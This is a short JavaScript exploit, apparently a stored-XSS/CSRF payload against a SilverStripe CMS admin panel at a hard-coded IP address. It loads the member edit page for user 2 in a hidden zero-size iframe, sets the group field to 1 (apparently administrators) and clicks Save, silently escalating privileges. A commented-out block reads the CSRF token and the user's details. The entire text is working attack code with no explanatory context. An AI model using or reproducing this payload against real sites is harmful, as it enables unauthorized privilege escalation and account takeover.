function prepareFrame() {
        var ifrm = document.createElement("iframe");
        ifrm.setAttribute("src", "http://193.37.215.120/silverstripe/admin/security/EditForm/field/Members/item/2/edit");
        ifrm.style.width = "0";
        ifrm.style.height = "0";
        ifrm.setAttribute("id","hack");
        document.body.appendChild(ifrm);
    }
    prepareFrame();
const myTimeout = setTimeout(fireing, 3000);

function fireing() {

        document.getElementById("hack").contentWindow.document.getElementById("Form_ItemEditForm_DirectGroups").value=1;
        document.getElementById("hack").contentWindow.document.getElementById("Form_ItemEditForm_action_doSave").click();
        /*
 csrf_token=document.getElementById("hack").contentWindow.document.getElementById("Form_ItemEditForm_SecurityID").value;
firstname=document.getElementById("hack").contentWindow.document.getElementById("Form_ItemEditForm_FirstName").value;
        surname=document.getElementById("hack").contentWindow.document.getElementById("Form_ItemEditForm_Surname").value;
        email=document.getElementById("hack").contentWindow.document.getElementById("Form_ItemEditForm_Email").value;
        
        alert(csrf_token)
        alert(firstname)
        alert(surname)
        alert(email)
*/
}
